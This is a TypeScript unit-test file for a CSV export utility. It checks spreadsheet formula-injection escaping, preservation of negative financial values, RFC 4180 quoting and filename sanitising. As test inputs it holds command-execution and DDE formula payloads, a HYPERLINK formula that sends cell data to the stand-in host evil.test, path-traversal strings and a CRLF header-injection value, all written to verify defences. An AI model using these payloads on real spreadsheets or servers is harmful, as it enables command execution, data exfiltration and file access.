import { csvCell, csvRow, safeFilename, toCsv, UTF8_BOM } from './csv.util';

/**
 * Phase 2D.7 — CSV serialisation and spreadsheet formula-injection defence.
 *
 * The two properties that fight each other are tested together on purpose: dangerous text must be
 * neutralised, AND legitimate negative financial values must survive untouched. A defence that
 * corrupts `-1250.00` would cause the very financial misstatement it exists to prevent.
 */

describe('csvCell — formula injection', () => {
  it.each(['=', '+', '-', '@', '\t', '\r'])('escapes a value starting with %j', (lead) => {
    const out = csvCell(`${lead}cmd|'/c calc'!A0`);
    expect(out.startsWith("'") || out.startsWith('"\'')).toBe(true);
  });

  it('neutralises the classic command-execution payload', () => {
    expect(csvCell('=cmd|\' /C calc\'!A0')).toContain("'=cmd");
  });

  it('neutralises a DDE payload', () => {
    expect(csvCell('@SUM(1+9)*cmd|\' /C calc\'!A0')).toContain("'@SUM");
  });

  it('neutralises a hyperlink-exfiltration payload', () => {
    const out = csvCell('=HYPERLINK("http://evil.test?x="&A1,"click")');
    expect(out).toContain("'=HYPERLINK");
  });

  it('escapes a formula that also needs quoting, in the right order', () => {
    const out = csvCell('=A1,"x"');
    // Apostrophe applied first, then RFC-4180 quoting wraps the whole cell.
    expect(out).toBe('"\'=A1,""x"""');
  });
});

describe('csvCell — legitimate financial values are NOT corrupted', () => {
  it.each(['-1250.00', '-0.5', '-1', '+42', '1250.00', '0', '0.0001', '-1e3', '1E-4', '.5', '-.5'])(
    'leaves the numeric value %s untouched',
    (n) => {
      expect(csvCell(n)).toBe(n);
    },
  );

  it('leaves a negative Decimal-as-string untouched (the ledger transports decimals as strings)', () => {
    expect(csvCell('-9544233.099999999999998')).toBe('-9544233.099999999999998');
  });

  it('still escapes something that only LOOKS numeric', () => {
    // Not a number: an injection dressed up with a leading digit-ish shape.
    expect(csvCell('-1+1')).toBe("'-1+1");
    expect(csvCell('-1e3-cmd')).toBe("'-1e3-cmd");
    expect(csvCell('+1-2+3')).toBe("'+1-2+3");
  });
});

describe('csvCell — RFC 4180', () => {
  it('quotes and doubles inner quotes', () => {
    expect(csvCell('he said "hi"')).toBe('"he said ""hi"""');
  });

  it('quotes a value containing a comma', () => {
    expect(csvCell('Smith, John')).toBe('"Smith, John"');
  });

  it('quotes a value containing a newline so the row cannot be split', () => {
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('renders null and undefined as an EMPTY cell, never "null" and never 0', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
    // The distinction that matters: an absent metric must not read as a measured zero.
    expect(csvCell(null)).not.toBe('0');
  });

  it('renders a real zero as 0', () => {
    expect(csvCell(0)).toBe('0');
  });

  it('leaves ordinary text alone', () => {
    expect(csvCell('INR')).toBe('INR');
    expect(csvCell('GAME_BET')).toBe('GAME_BET');
  });
});

describe('csvRow / toCsv', () => {
  it('joins cells with commas', () => {
    expect(csvRow(['a', 'b', 1])).toBe('a,b,1');
  });

  it('emits a BOM, CRLF terminators and a trailing newline', () => {
    const csv = toCsv(['x', 'y'], [[1, 2]]);
    expect(csv.startsWith(UTF8_BOM)).toBe(true);
    expect(csv).toBe(`${UTF8_BOM}x,y\r\n1,2\r\n`);
  });

  it('keeps column count stable when a row contains nulls', () => {
    const csv = toCsv(['a', 'b', 'c'], [[1, null, 3]]);
    const body = csv.replace(UTF8_BOM, '').trim().split('\r\n')[1]!;
    expect(body.split(',')).toHaveLength(3);
    expect(body).toBe('1,,3');
  });
});

describe('safeFilename — path traversal and header injection', () => {
  it.each([
    ['../../etc/passwd', 'etc-passwd'],
    ['..\\..\\windows\\system32', 'windows-system32'],
    ['report/../../secret.csv', 'report-.-.-secret.csv'],
  ])('strips traversal from %s', (input, expected) => {
    const out = safeFilename(input);
    expect(out).toBe(expected);
    expect(out).not.toContain('/');
    expect(out).not.toContain('\\');
    // Stronger than "no separators": the name cannot even LOOK like a traversal.
    expect(out).not.toContain('..');
  });

  it('removes quotes and CR/LF so a Content-Disposition header cannot be broken', () => {
    const out = safeFilename('a"\r\nSet-Cookie: evil=1');
    expect(out).not.toMatch(/["\r\n]/);
  });

  it('never returns an empty name', () => {
    expect(safeFilename('///')).toBe('report');
    expect(safeFilename('')).toBe('report');
  });

  it('keeps a legitimate generated name intact', () => {
    expect(safeFilename('financial-2026-01-01_to_2026-02-01.csv'))
      .toBe('financial-2026-01-01_to_2026-02-01.csv');
  });
});
